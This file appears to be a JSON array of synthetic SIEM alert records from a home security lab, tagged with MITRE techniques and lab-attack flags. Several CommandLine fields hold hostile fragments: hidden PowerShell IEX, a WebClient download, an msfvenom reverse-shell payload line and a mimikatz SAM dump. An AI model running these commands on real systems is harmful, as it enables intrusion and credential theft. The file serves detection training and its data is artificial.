  {
    "TimeGenerated": "2026-04-24T11:50:37.668039",
    "EventType": "Impossible Travel",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "john.doe",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1078.004",
    "LogSource": "Azure AD / Okta",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T12:14:37.668156",
    "EventType": "Impossible Travel",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "lab.administrator",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1078.004",
    "LogSource": "Azure AD / Okta",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T17:33:37.663547",
    "EventType": "Sysmon Network Connection",
    "Severity": "High",
    "EventCode": 3,
    "UserAccount": "dev.engineer",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "185.220.101.45",
    "MitreTechnique": "T1071.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "wmic.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T12:21:37.663897",
    "EventType": "Sysmon File Create",
    "Severity": "Medium",
    "EventCode": 11,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1105",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "cmd.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T03:04:37.664620",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "jane.smith",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell -nop -w hidden -c IEX",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T10:44:37.665344",
    "EventType": "Privilege Escalation",
    "Severity": "Critical",
    "EventCode": 4672,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1068",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T15:18:37.664642",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "lab.administrator",
    "Computer": "ELK-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell -c (New-Object Net.WebClient).DownloadFile",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T20:49:37.666910",
    "EventType": "Data Exfiltration Suspected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": "dev.engineer",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": null,
    "DestinationIP": "23.129.64.100",
    "MitreTechnique": "T1048",
    "LogSource": "Firewall",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T21:15:37.665684",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "john.doe",
    "Computer": null,
    "SourceIP": "192.168.56.102",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T05:45:37.662888",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T22:58:37.662432",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "ubuntu",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-23T00:33:37.666734",
    "EventType": "DNS Tunneling Detected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "DEV-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1071.004",
    "LogSource": "DNS / Zeek",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T22:47:37.661412",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-21T20:13:37.660880",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "svc.backup",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": "192.168.56.102",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T13:56:37.666609",
    "EventType": "DNS Tunneling Detected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "FIN-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1071.004",
    "LogSource": "DNS / Zeek",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T04:49:37.666797",
    "EventType": "Data Exfiltration Suspected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": "jane.smith",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": "103.45.78.21",
    "MitreTechnique": "T1048",
    "LogSource": "Firewall",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T18:59:37.667171",
    "EventType": "Credential Dumping",
    "Severity": "Critical",
    "EventCode": 10,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon Event ID 10",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": "procdump.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T01:38:37.664241",
    "EventType": "Reverse Shell Detected",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "192.168.56.104",
    "MitreTechnique": "T1059.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Metasploit / Netcat"
  },
  {
    "TimeGenerated": "2026-04-23T12:52:37.662857",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "attacker",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T01:56:37.663789",
    "EventType": "Sysmon Image Load",
    "Severity": "High",
    "EventCode": 7,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1055.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "wmic.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T18:50:37.667921",
    "EventType": "Cloud IAM Change",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "temp.analyst",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1098",
    "LogSource": "CloudTrail / Azure AD",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T15:19:37.662349",
    "EventType": "RDP Brute Force",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra / CrackMapExec"
  },
  {
    "TimeGenerated": "2026-04-23T13:32:37.660434",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "jane.smith",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.101",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T13:58:37.661223",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "10.0.2.10",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T16:09:37.661482",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-20T19:22:37.659593",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "dev.engineer",
    "Computer": "FIN-SERVER-01",
    "SourceIP": "185.220.101.45",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T00:09:37.666864",
    "EventType": "Data Exfiltration Suspected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": "finance.user",
    "Computer": "DEV-SERVER-01",
    "SourceIP": null,
    "DestinationIP": "77.73.133.84",
    "MitreTechnique": "T1048",
    "LogSource": "Firewall",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T20:38:37.665797",
    "EventType": "PsExec Detected",
    "Severity": "High",
    "EventCode": 7045,
    "UserAccount": "svc.backup",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1570",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T03:00:37.665021",
    "EventType": "Port Scan Detected",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1046",
    "LogSource": "Firewall / IDS",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Nmap"
  },
  {
    "TimeGenerated": "2026-04-23T15:40:37.665247",
    "EventType": "Privilege Escalation",
    "Severity": "Critical",
    "EventCode": 4672,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1068",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T01:30:37.662729",
    "EventType": "Kerberos TGS Request",
    "Severity": "High",
    "EventCode": 4769,
    "UserAccount": "finance.user",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1558.003",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T16:10:37.666069",
    "EventType": "C2 Outbound Connection",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "103.45.78.21",
    "MitreTechnique": "T1071.001",
    "LogSource": "Firewall / Sysmon",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T00:58:37.665651",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "lab.administrator",
    "Computer": null,
    "SourceIP": "192.168.56.101",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T15:39:37.662710",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "admin",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-21T18:58:37.663658",
    "EventType": "Sysmon Network Connection",
    "Severity": "Medium",
    "EventCode": 3,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "45.67.22.10",
    "MitreTechnique": "T1071.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "rundll32.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T05:04:37.660704",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "john.doe",
    "Computer": "KALI-LAB-01",
    "SourceIP": "172.16.0.100",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T09:32:37.662310",
    "EventType": "RDP Brute Force",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "svc.splunk",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra / CrackMapExec"
  },
  {
    "TimeGenerated": "2026-04-23T15:24:37.664264",
    "EventType": "Reverse Shell Detected",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "jane.smith",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "192.168.56.104",
    "MitreTechnique": "T1059.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Metasploit / Netcat"
  },
  {
    "TimeGenerated": "2026-04-21T16:06:37.667649",
    "EventType": "Process Injection",
    "Severity": "Critical",
    "EventCode": 8,
    "UserAccount": null,
    "Computer": "KALI-LAB-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1055",
    "LogSource": "Sysmon Event ID 8",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T15:01:37.666461",
    "EventType": "C2 Outbound Connection",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "23.129.64.100",
    "MitreTechnique": "T1071.001",
    "LogSource": "Firewall / Sysmon",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T09:58:37.659761",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "svc.backup",
    "Computer": "KALI-LAB-01",
    "SourceIP": "194.165.16.11",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T10:10:37.660082",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "attacker",
    "Computer": "FIN-SERVER-01",
    "SourceIP": "45.67.22.10",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T14:56:37.664756",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "temp.analyst",
    "Computer": "KALI-LAB-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell.exe -enc SQBFAFgA",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T23:37:37.661506",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-21T12:20:37.659916",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "svc.backup",
    "Computer": "KALI-LAB-01",
    "SourceIP": "45.67.22.10",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T19:56:37.667367",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "Meterpreter",
    "FileHash": "0123456789abcdef0123456789abcdef",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T18:21:37.661215",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "praharsh.admin",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": "192.168.56.102",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T19:08:37.662398",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "root",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-21T04:06:37.660876",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "attacker",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": "172.16.0.100",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T13:24:37.669270",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T16:22:37.663279",
    "EventType": "Sysmon Process Create",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "mimikatz.exe lsadump::sam",
    "ProcessName": "mimikatz.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  }
]